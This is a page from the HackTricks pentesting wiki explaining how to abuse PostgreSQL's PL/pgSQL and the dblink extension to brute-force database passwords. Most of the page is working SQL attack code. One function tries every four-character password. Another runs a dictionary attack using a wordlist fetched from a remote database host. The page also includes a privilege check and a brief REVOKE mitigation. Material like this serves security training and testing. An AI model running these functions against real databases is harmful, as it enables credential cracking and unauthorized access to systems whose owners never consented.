# PL/pgSQL Password Bruteforce

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

PL/pgSQL, as a **fully featured programming language**, allows much more procedural control than SQL, including the **ability to use loops and other control structures**. SQL statements and triggers can call functions created in the PL/pgSQL language.

You can abuse this language in order to ask PostgreSQL to brute-force the users credentials, but it must exist on the database. You can verify it's existence using:

```sql
SELECT lanname,lanacl FROM pg_language WHERE lanname = 'plpgsql';
     lanname | lanacl
    ---------+---------
     plpgsql |
```

By default, **creating functions is a privilege granted to PUBLIC**, where PUBLIC refers to every user on that database system. To prevent this, the administrator could have had to revoke the USAGE privilege from the PUBLIC domain:

```sql
REVOKE ALL PRIVILEGES ON LANGUAGE plpgsql FROM PUBLIC;
```

In that case, our previous query would output different results:

```sql
SELECT lanname,lanacl FROM pg_language WHERE lanname = 'plpgsql';
     lanname | lanacl
    ---------+-----------------
     plpgsql | {admin=U/admin}
```

Note that for the following script to work **the function `dblink` needs to exist**. If it doesn't you could try to create it with&#x20;

```sql
CREATE EXTENSION dblink;
```

## Password Brute Force

Here how you could perform a 4 chars password bruteforce:

```sql
//Create the brute-force function
CREATE OR REPLACE FUNCTION brute_force(host TEXT, port TEXT,
                                username TEXT, dbname TEXT) RETURNS TEXT AS
$$
DECLARE
    word TEXT;
BEGIN
    FOR a IN 65..122 LOOP
        FOR b IN 65..122 LOOP
            FOR c IN 65..122 LOOP
                FOR d IN 65..122 LOOP
                    BEGIN
                        word := chr(a) || chr(b) || chr(c) || chr(d);
                        PERFORM(SELECT * FROM dblink(' host=' || host ||
                                                    ' port=' || port ||
                                                    ' dbname=' || dbname ||
                                                    ' user=' || username ||
                                                    ' password=' || word,
                                                    'SELECT 1') 
                                                    RETURNS (i INT));
                                                    RETURN word;
                        EXCEPTION
                            WHEN sqlclient_unable_to_establish_sqlconnection 
                                THEN
                                    -- do nothing
                    END;
                END LOOP;
            END LOOP;
        END LOOP;
    END LOOP;
    RETURN NULL;
END;
$$ LANGUAGE 'plpgsql';

//Call the function
select brute_force('127.0.0.1', '5432', 'postgres', 'postgres');
```

_Note that even brute-forcing 4 characters may take several minutes._

You could also **download a wordlist** and try only those passwords (dictionary attack):

```sql
//Create the function
CREATE OR REPLACE FUNCTION brute_force(host TEXT, port TEXT,
                                username TEXT, dbname TEXT) RETURNS TEXT AS
$$
BEGIN
    FOR word IN (SELECT word FROM dblink('host=1.2.3.4
                                            user=name
                                            password=qwerty
                                            dbname=wordlists',
                                            'SELECT word FROM wordlist')
                                        RETURNS (word TEXT)) LOOP
        BEGIN
            PERFORM(SELECT * FROM dblink(' host=' || host ||
                                            ' port=' || port ||
                                            ' dbname=' || dbname ||
                                            ' user=' || username ||
                                            ' password=' || word,
                                            'SELECT 1')
                                        RETURNS (i INT));
            RETURN word;

            EXCEPTION
                WHEN sqlclient_unable_to_establish_sqlconnection THEN
                    -- do nothing
        END;
    END LOOP;
    RETURN NULL;
END;
$$ LANGUAGE 'plpgsql'

//Call the function
select brute_force('127.0.0.1', '5432', 'postgres', 'postgres');
```

**Find**[ **more information about this attack in this paper**](http://www.leidecker.info/pgshell/Having\_Fun\_With\_PostgreSQL.txt)**.**

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
